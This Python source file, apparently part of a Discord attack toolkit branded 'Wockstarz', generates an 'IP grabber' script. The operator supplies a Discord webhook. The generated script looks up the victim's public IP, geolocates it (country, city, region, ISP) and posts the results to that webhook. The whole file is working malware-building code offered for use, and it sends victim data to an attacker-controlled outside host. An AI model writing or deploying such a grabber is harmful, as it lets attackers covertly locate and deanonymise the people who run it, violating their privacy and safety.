from Helper import *
from Helper.Common.utils import *

def make_ip_grabber():
    new_title("Ip grabber Wockstarz")
    webhook_input = input(f"{Fore.RESET}[{Fore.RED}>{Fore.RESET}] Input Your discord webhook: ")
    code = r"""
import requests

def get_ip():
    r = requests.get("https://api.ipify.org/")
    ip = r.text
    return ip

def get_geo(ip):
    response = requests.get(f"http://ip-api.com/json/{ip}")
    data = response.json()
    country = data['country']
    city =  data['city']
    region_name = data['regionName']
    ISP =  data['isp']
    return country, city, region_name, ISP

def grab_ip():
    ip = get_ip()
    country, city, region_name, ISP = get_geo(ip)
    message = {
        "content": " ",
        "embeds": [
            {
                "title": "Ip Grabber",
                "description": f"IP: {ip}",
                "color": 0xADD8E6,
                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1239321740316774400/1239636057562026175/Screenshot-2024-05-13-131009.gif?ex=6661f70b&is=6660a58b&hm=e7c5a9c1ac191e6eb853c20006ee6d93552c7dfce6efc0c477fba535c9a3aaeb&"},
    "fields": [
        {"name": "Country", "value": country},
        {"name": "City", "value": city},
        {"name": "Region", "value": region_name},
        {"name": "ISP", "value": ISP}
    ],

                "footer": {
                    "text": "Wockstarz"
                }
            }
        ]
    }
    requests.post("{webhook}", json=message)

grab_ip()
"""

    code = code.replace("{webhook}", webhook_input)
    with open ("Output/Danger/ip_grabber.py", "w", encoding="utf-8") as file:
        file.write(code)
    print(f"{lc} Ip grabber file succsefully Created in Output/Danger/ip_grabber.py!")
    input("Press Enter To continue...")


